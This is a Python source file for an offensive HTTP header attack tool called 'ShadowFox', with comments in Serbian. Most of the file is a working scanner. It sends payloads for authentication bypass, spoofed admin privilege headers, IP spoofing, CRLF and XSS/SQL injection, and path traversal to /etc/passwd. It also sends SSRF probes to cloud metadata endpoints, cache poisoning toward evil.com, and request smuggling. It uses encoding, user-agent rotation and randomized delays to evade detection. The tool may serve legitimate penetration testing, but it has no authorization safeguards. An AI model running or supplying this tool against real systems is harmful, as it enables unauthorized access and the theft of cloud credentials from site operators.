#!/usr/bin/env python3
"""
🚀 SHADOWFOX ADVANCED HEADER ATTACK MODULE
Elitni modul - Sofisticirani napadi preko HTTP header-a
Autor: Whitefox980 | Verzija: 2025.06.06 - ADVANCED
"""

import requests
import json
import time
import random
import base64
import hashlib
import uuid
from urllib.parse import quote, unquote
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ShadowAdvancedHeaderFuzz:
    def __init__(self):
        self.session = requests.Session()
        self.meta_config = {}
        self.recon_data = {}
        self.results = {
            "mission_info": {},
            "attack_summary": {},
            "header_vulnerabilities": [],
            "header_injection_results": [],
            "authentication_bypasses": [],
            "privilege_escalations": [],
            "header_smuggling": [],
            "cache_poisoning": [],
            "ssrf_attempts": [],
            "statistics": {}
        }
        
        # Advanced Header Attack Vectors
        self.attack_vectors = {
            "authentication_bypass": {
                "X-Original-URL": ["/admin", "/admin/", "/admin/panel", "/dashboard"],
                "X-Rewrite-URL": ["/admin", "/admin/", "/admin/panel", "/dashboard"],
                "X-Forwarded-Host": ["admin.localhost", "127.0.0.1", "admin.internal"],
                "X-Host": ["admin.localhost", "127.0.0.1", "localhost"],
                "X-Forwarded-Server": ["admin.internal", "127.0.0.1"],
                "X-HTTP-Host-Override": ["admin.localhost", "127.0.0.1"],
                "X-Forwarded-Proto": ["https"],
                "X-Forwarded-Scheme": ["https"],
                "X-Scheme": ["https"]
            },
            
            "privilege_escalation": {
                "X-User-ID": ["1", "0", "admin", "root", "administrator"],
                "X-Username": ["admin", "root", "administrator", "system"],
                "X-User": ["admin", "root", "administrator"],
                "X-Role": ["admin", "administrator", "root", "superuser"],
                "X-Admin": ["true", "1", "yes"],
                "X-Is-Admin": ["true", "1", "yes"],
                "X-Privilege": ["admin", "root", "high"],
                "X-Access-Level": ["admin", "root", "9", "100"],
                "X-Account-Type": ["admin", "premium", "enterprise"]
            },
            
            "ip_spoofing": {
                "X-Forwarded-For": ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1"],
                "X-Real-IP": ["127.0.0.1", "localhost", "10.0.0.1"],
                "X-Client-IP": ["127.0.0.1", "localhost", "10.0.0.1"],
                "X-Remote-IP": ["127.0.0.1", "localhost"],
                "X-Remote-Addr": ["127.0.0.1", "localhost"],
                "X-Originating-IP": ["127.0.0.1", "localhost"],
                "Client-IP": ["127.0.0.1", "localhost"],
                "True-Client-IP": ["127.0.0.1", "localhost"]
            },
            
            "header_injection": {
                "User-Agent": [
                    "\\r\\nSet-Cookie: admin=true",
                    "\\r\\nLocation: http://evil.com",
                    "<script>alert('XSS')</script>",
                    "' OR 1=1--",
                    "../../../etc/passwd"
                ],
                "Referer": [
                    "javascript:alert('XSS')",
                    "<script>alert('XSS')</script>",
                    "' OR 1=1--",
                    "../../../etc/passwd"
                ],
                "Accept-Language": [
                    "../../../etc/passwd",
                    "<script>alert('XSS')</script>",
                    "' OR 1=1--"
                ]
            },
            
            "ssrf_payloads": {
                "X-Forwarded-Host": [
                    "http://127.0.0.1:22",
                    "http://127.0.0.1:3306", 
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://burpcollaborator.net"
                ],
                "Host": [
                    "127.0.0.1:22",
                    "127.0.0.1:3306",
                    "169.254.169.254",
                    "metadata.google.internal"
                ]
            },
            
            "cache_poisoning": {
                "X-Forwarded-Host": ["evil.com", "attacker.com"],
                "X-Host": ["evil.com", "attacker.com"],
                "X-Forwarded-Scheme": ["javascript"],
                "X-Forwarded-Proto": ["javascript"]
            },
            
            "http_smuggling": {
                "Transfer-Encoding": ["chunked", "chunked\\r\\nTransfer-Encoding: x"],
                "Content-Length": ["0"],
                "Connection": ["keep-alive", "close"]
            }
        }
        
        # Advanced evasion techniques
        self.evasion_techniques = [
            "double_encoding",
            "unicode_encoding", 
            "case_variation",
            "space_manipulation",
            "null_byte_injection"
        ]
        
    def load_dependencies(self):
        """Učitava Meta config i Recon podatke"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                
            print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
            print(f"🎯 [RECON] Učitano {len(self.recon_data.get('discovered_endpoints', []))} endpoint-a")
            
        except FileNotFoundError as e:
            print(f"❌ [ERROR] Nedostaje dependency: {str(e)}")
            exit(1)
            
    def setup_session(self):
        """Napredna konfiguracija sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        # Rotacija User-Agent-a
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        
        self.session.verify = False
        self.session.timeout = 20
        self.session.allow_redirects = False  # Bitno za header attacks
        
    def intelligent_delay(self):
        """Pametno kašnjenje sa anti-detection logikom"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            # Randomizovano kašnjenje sa Gaussian distribution
            jitter = random.gauss(0, delay * 0.3)
            total_delay = max(delay + jitter, 0.5)
            time.sleep(total_delay)
        else:
            time.sleep(random.uniform(0.2, 0.8))
            
    def apply_evasion_technique(self, payload, technique):
        """Primenjuje evasion tehnike na payload"""
        if technique == "double_encoding":
            return quote(quote(payload, safe=''), safe='')
        elif technique == "unicode_encoding":
            return payload.encode('unicode_escape').decode('ascii')
        elif technique == "case_variation":
            return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
        elif technique == "space_manipulation":
            return payload.replace(' ', '\t').replace(' ', '\n')
        elif technique == "null_byte_injection":
            return payload + '\x00'
        return payload
        
    def generate_dynamic_payloads(self, base_payload):
        """Generiše dinamičke payload varijante"""
        payloads = [base_payload]
        
        # Base64 encoding
        try:
            b64_payload = base64.b64encode(base_payload.encode()).decode()
            payloads.append(b64_payload)
        except:
            pass
            
        # URL encoding variations
        payloads.append(quote(base_payload))
        payloads.append(quote(base_payload, safe=''))
        
        # Evasion techniques
        for technique in self.evasion_techniques:
            try:
                evaded = self.apply_evasion_technique(base_payload, technique)
                payloads.append(evaded)
            except:
                pass
                
        return list(set(payloads))  # Remove duplicates
        
    def detect_header_vulnerability(self, response, payload, header_name, attack_type):
        """Napredna detekcija ranjivosti u header napadima"""
        indicators = []
        response_text = response.text.lower()
        
        # Authentication bypass indicators
        if attack_type == "authentication_bypass":
            bypass_indicators = [
                "admin panel", "dashboard", "administration", "welcome admin",
                "admin area", "control panel", "management console"
            ]
            for indicator in bypass_indicators:
                if indicator in response_text:
                    indicators.append({
                        "type": "Authentication Bypass",
                        "severity": "CRITICAL",
                        "indicator": f"Admin content accessed: {indicator}",
                        "header": header_name,
                        "payload": payload,
                        "status_code": response.status_code
                    })
                    
        # Privilege escalation indicators  
        elif attack_type == "privilege_escalation":
            if response.status_code in [200, 302] and any(term in response_text for term in 
                ["admin", "administrator", "root", "elevated", "superuser"]):
                indicators.append({
                    "type": "Privilege Escalation",
                    "severity": "CRITICAL", 
                    "indicator": "Elevated privileges detected in response",
                    "header": header_name,
                    "payload": payload,
                    "status_code": response.status_code
                })
                
        # SSRF indicators
        elif attack_type == "ssrf_payloads":
            ssrf_indicators = [
                "connection refused", "timeout", "network unreachable",
                "internal server error", "bad gateway", "service unavailable"
            ]
            if any(indicator in response_text for indicator in ssrf_indicators):
                indicators.append({
                    "type": "SSRF",
                    "severity": "HIGH",
                    "indicator": "SSRF behavior detected",
                    "header": header_name, 
                    "payload": payload,
                    "status_code": response.status_code
                })
                
        # Header injection indicators
        elif attack_type == "header_injection":
            if "set-cookie" in response.headers.get('Set-Cookie', '').lower():
                if "admin=true" in response.headers.get('Set-Cookie', ''):
                    indicators.append({
                        "type": "Header Injection", 
                        "severity": "HIGH",
                        "indicator": "Cookie injection successful",
                        "header": header_name,
                        "payload": payload,
                        "evidence": response.headers.get('Set-Cookie')
                    })
                    
        # Cache poisoning indicators
        elif attack_type == "cache_poisoning":
            if response.status_code == 200:
                cache_headers = ['X-Cache', 'CF-Cache-Status', 'Cache-Control']
                for cache_header in cache_headers:
                    if cache_header in response.headers:
                        indicators.append({
                            "type": "Cache Poisoning",
                            "severity": "MEDIUM",
                            "indicator": f"Response cached with malicious header: {cache_header}",
                            "header": header_name,
                            "payload": payload,
                            "cache_header": response.headers[cache_header]
                        })
                        
        return indicators
        
    def advanced_response_analysis(self, baseline_response, test_response, payload, header_name):
        """Napredna analiza response-a"""
        anomalies = []
        
        # Status code analysis
        if test_response.status_code != baseline_response.status_code:
            severity = "HIGH" if test_response.status_code in [200, 302, 301] else "MEDIUM"
            anomalies.append({
                "type": "Status Code Change",
                "severity": severity,
                "details": f"Changed from {baseline_response.status_code} to {test_response.status_code}",
                "header": header_name,
                "payload": payload
            })
            
        # Response length analysis
        length_diff = abs(len(test_response.text) - len(baseline_response.text))
        if length_diff > 500:  # Significant difference
            anomalies.append({
                "type": "Significant Content Change",
                "severity": "MEDIUM", 
                "details": f"Content length changed by {length_diff} characters",
                "header": header_name,
                "payload": payload
            })
            
        # Header differences
        baseline_headers = set(baseline_response.headers.keys())
        test_headers = set(test_response.headers.keys())
        
        new_headers = test_headers - baseline_headers
        missing_headers = baseline_headers - test_headers
        
        if new_headers:
            anomalies.append({
                "type": "New Headers Introduced",
                "severity": "MEDIUM",
                "details": f"New headers: {', '.join(new_headers)}",
                "header": header_name,
                "payload": payload
            })
            
        # Redirect analysis
        if test_response.status_code in [301, 302, 303, 307, 308]:
            redirect_location = test_response.headers.get('Location', '')
            if redirect_location:
                anomalies.append({
                    "type": "Redirect Triggered",
                    "severity": "MEDIUM",
                    "details": f"Redirected to: {redirect_location}",
                    "header": header_name,
                    "payload": payload
                })
                
        return anomalies
        
    def test_header_attack_vector(self, url, attack_type, attack_vectors):
        """Testira specifičan tip header napada"""
        print(f"🎯 [HEADER ATTACK] Type: {attack_type}")
        
        vulnerabilities = []
        
        # Baseline request
        try:
            baseline_response = self.session.get(url)
        except Exception as e:
            print(f"❌ [BASELINE ERROR] {url}: {str(e)}")
            return vulnerabilities
            
        for header_name, payloads in attack_vectors.items():
            print(f"   🔍 Testing header: {header_name}")
            
            for base_payload in payloads:
                # Generate dynamic payload variations
                payload_variants = self.generate_dynamic_payloads(base_payload)
                
                for payload in payload_variants:
                    self.intelligent_delay()
                    
                    # Rotate User-Agent
                    test_headers = {
                        header_name: payload,
                        'User-Agent': random.choice(self.user_agents)
                    }
                    
                    try:
                        test_response = self.session.get(url, headers=test_headers)
                        
                        # Detect vulnerabilities
                        vuln_indicators = self.detect_header_vulnerability(
                            test_response, payload, header_name, attack_type
                        )
                        
                        # Advanced response analysis
                        anomalies = self.advanced_response_analysis(
                            baseline_response, test_response, payload, header_name
                        )
                        
                        # Store results
                        test_result = {
                            "url": url,
                            "attack_type": attack_type,
                            "header_name": header_name,
                            "payload": payload,
                            "base_payload": base_payload,
                            "status_code": test_response.status_code,
                            "response_length": len(test_response.text),
                            "vulnerability_indicators": vuln_indicators,
                            "anomalies": anomalies,
                            "response_headers": dict(test_response.headers),
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                        }
                        
                        self.results["header_injection_results"].append(test_result)
                        
                        # Categorize vulnerabilities
                        if vuln_indicators:
                            vulnerabilities.extend(vuln_indicators)
                            
                            for vuln in vuln_indicators:
                                if vuln['type'] == "Authentication Bypass":
                                    self.results["authentication_bypasses"].append(vuln)
                                elif vuln['type'] == "Privilege Escalation":
                                    self.results["privilege_escalations"].append(vuln)
                                elif vuln['type'] == "SSRF":
                                    self.results["ssrf_attempts"].append(vuln)
                                elif vuln['type'] == "Cache Poisoning":
                                    self.results["cache_poisoning"].append(vuln)
                                    
                            print(f"      🚨 VULNERABILITY: {len(vuln_indicators)} indicators found!")
                            
                    except Exception as e:
                        print(f"      ❌ [REQUEST ERROR] {payload[:30]}...: {str(e)}")
                        
        return vulnerabilities
        
    def test_custom_headers(self, url):
        """Test custom/proprietary headers discovered in recon"""
        print("🔍 [CUSTOM HEADERS] Testing discovered headers...")
        
        discovered_headers = self.recon_data.get('discovered_headers', [])
        
        for header_data in discovered_headers:
            present_headers = header_data.get('present_security_headers', [])
            all_headers = header_data.get('all_headers', {})
            
            # Test manipulation of existing headers
            for header_info in present_headers:
                header_name = header_info['header']
                original_value = header_info['value']
                
                malicious_values = [
                    "bypass", "admin", "../../../etc/passwd",
                    "<script>alert('XSS')</script>", "' OR 1=1--"
                ]
                
                for malicious_value in malicious_values:
                    test_headers = {header_name: malicious_value}
                    
                    try:
                        self.intelligent_delay()
                        response = self.session.get(url, headers=test_headers)
                        
                        # Simple vulnerability check
                        if response.status_code != 403 and "error" not in response.text.lower():
                            vuln = {
                                "type": "Custom Header Manipulation",
                                "severity": "MEDIUM",
                                "header": header_name,
                                "original_value": original_value,
                                "malicious_value": malicious_value,
                                "status_code": response.status_code
                            }
                            self.results["header_vulnerabilities"].append(vuln)
                            
                    except Exception as e:
                        continue
                        
    def generate_attack_summary(self):
        """Generiše sažetak header attack operacije"""
        total_tests = len(self.results["header_injection_results"])
        total_vulnerabilities = len(self.results["header_vulnerabilities"])
        
        summary = {
            "total_header_tests": total_tests,
            "total_vulnerabilities": total_vulnerabilities,
            "authentication_bypasses": len(self.results["authentication_bypasses"]),
            "privilege_escalations": len(self.results["privilege_escalations"]),
            "ssrf_attempts": len(self.results["ssrf_attempts"]),
            "cache_poisoning": len(self.results["cache_poisoning"]),
            "header_smuggling": len(self.results["header_smuggling"]),
            "attack_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "most_vulnerable_headers": self.get_most_vulnerable_headers(),
            "critical_findings": self.get_critical_findings()
        }
        
        self.results["attack_summary"] = summary
        self.results["statistics"] = summary
        
    def get_most_vulnerable_headers(self):
        """Dobija header-e sa najviše ranjivosti"""
        header_vuln_count = {}
        
        for result in self.results["header_injection_results"]:
            if result["vulnerability_indicators"]:
                header = result["header_name"]
                if header not in header_vuln_count:
                    header_vuln_count[header] = 0
                header_vuln_count[header] += len(result["vulnerability_indicators"])
                
        return dict(sorted(header_vuln_count.items(), key=lambda x: x[1], reverse=True)[:10])
        
    def get_critical_findings(self):
        """Izdvaja kritične nalaze"""
        critical = []
        
        all_vulns = (self.results["authentication_bypasses"] + 
                    self.results["privilege_escalations"] + 
                    self.results["ssrf_attempts"])
        
        for vuln in all_vulns:
            if vuln.get("severity") == "CRITICAL":
                critical.append({
                    "type": vuln["type"],
                    "header": vuln.get("header"),
                    "payload": vuln.get("payload"),
                    "indicator": vuln.get("indicator")
                })
                
        return critical[:10]  # Top 10 critical
        
    def save_results(self):
        """Snimanje rezultata u attack_header_fuzz.json"""
        output_file = "Napad/attack_header_fuzz.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Header attack rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_attack_summary(self):
        """Prikaz sažetka header attack operacije"""
        summary = self.results["attack_summary"]
        
        print("\n🚀 SHADOWFOX ADVANCED HEADER ATTACK - SAŽETAK")
        print("=" * 60)
        print(f"🎯 Ukupno header testova: {summary['total_header_tests']}")
        print(f"🚨 Ukupno ranjivosti: {summary['total_vulnerabilities']}")
        print(f"🔓 Authentication bypasses: {summary['authentication_bypasses']}")
        print(f"🔝 Privilege escalations: {summary['privilege_escalations']}")
        print(f"🌐 SSRF attempts: {summary['ssrf_attempts']}")
        print(f"💾 Cache poisoning: {summary['cache_poisoning']}")
        
        if summary['critical_findings']:
            print(f"\n🚨 KRITIČNI NALAZI:")
            for finding in summary['critical_findings'][:5]:
                print(f"   • {finding['type']}: {finding['header']} -> {finding['payload'][:50]}...")
                
        if summary['most_vulnerable_headers']:
            print(f"\n🎯 NAJRANJIVIJI HEADER-I:")
            for header, count in list(summary['most_vulnerable_headers'].items())[:5]:
                print(f"   • {header}: {count} ranjivosti")
                
        print(f"\n✅ Rezultati: Napad/attack_header_fuzz.json")
        
    def run_advanced_header_attack(self):
        """Glavna advanced header attack operacija"""
        print("🚀 SHADOWFOX ADVANCED HEADER ATTACK - POKRETANJE")
        print("=" * 60)
        
        # 1. Učitaj dependencies
        self.load_dependencies()
        
        # 2. Podesi naprednu sesiju
        self.setup_session()
        
        # 3. Dobij target URL-ove
        target_root = self.meta_config.get('target_root')
        endpoints = self.recon_data.get('discovered_endpoints', [])
        
        test_urls = [target_root] if target_root else []
        test_urls.extend([ep['url'] for ep in endpoints[:5]])  # Top 5 endpoints
        
        # 4. Pokreni sve attack vektore
        for url in test_urls:
            print(f"\n🎯 [TARGET] {url}")
            
            for attack_type, attack_vectors in self.attack_vectors.items():
                print(f"🔥 [ATTACK TYPE] {attack_type}")
                self.test_header_attack_vector(url, attack_type, attack_vectors)
                
            # Test custom headers
            self.test_custom_headers(url)
            
        # 5. Generiši sažetak
        print("📊 [SUMMARY] Generisanje sažetka...")
        self.generate_attack_summary()
        
        # 6. Snimi rezultate
        self.save_results()
        
        # 7. Prikaži sažetak
        self.display_attack_summary()

def main():
    attacker = ShadowAdvancedHeaderFuzz()
    attacker.run_advanced_header_attack()

if __name__ == "__main__":
    main()
